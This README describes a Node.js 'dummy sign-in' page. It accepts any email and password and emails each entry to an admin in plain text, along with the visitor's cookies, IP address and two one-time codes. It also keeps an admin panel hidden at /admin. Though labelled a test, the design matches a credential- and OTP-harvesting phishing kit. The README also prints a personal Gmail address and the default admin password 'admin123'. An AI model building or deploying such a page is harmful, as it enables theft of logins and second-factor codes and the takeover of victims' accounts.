# Dummy Sign-In Test (with real random OTP via Nodemailer)

Multi-step dummy authentication that generates **random 6-digit OTPs** and sends them to the user’s email using **Nodemailer + Gmail SMTP**.

## Features
- Email + Password (any value accepted) → immediately emailed to admin + OTP 1 generated & sent to user
- Username (any value) → emailed to admin
- OTP 1 (must match the one sent to user)
- OTP 2 (must match the one sent to user)
- Admin receives every step in plain text (including Cookies, IP, Timestamp and the OTPs)
- Password field has 👁️ show/hide toggle
- Only the admin has a real password
- **Admin panel is hidden** at `/admin` (not linked from the user page)

## Setup (required)

### 1. Create a Google App Password
1. Go to your Google Account → Security
2. Enable **2-Step Verification** (if not already)
3. Search for **App passwords**
4. Create a new App Password for “Mail”
5. Copy the 16-character password

### 2. Configure environment variables
```bash
cp .env.example .env
```

Edit `.env`:
```env
GMAIL_USER=blessedresult6@gmail.com
GMAIL_APP_PASSWORD=your_16_char_app_password_here
ADMIN_PASSWORD=admin123
PORT=3000
```

### 3. Install & run
```bash
npm install
npm start
```

### URLs
| Page              | URL                          | Visible to dummy users? |
|-------------------|------------------------------|-------------------------|
| User login flow   | http://localhost:3000/       | Yes                     |
| **Admin panel**   | http://localhost:3000/admin  | **No** (hidden)         |

**Admin login**
- Email: `blessedresult6@gmail.com`
- Password: `admin123` (or whatever you set in `.env`)

## Important
- Never commit the real `.env` file (it is already in `.gitignore`)
- The OTPs are randomly generated on the server and sent to the email the user typed
- Admin still gets full plain-text copies of everything
- The admin panel is **not** linked or mentioned on the user-facing page

Repo: https://github.com/Dennisbed1234/dummy-signin-test
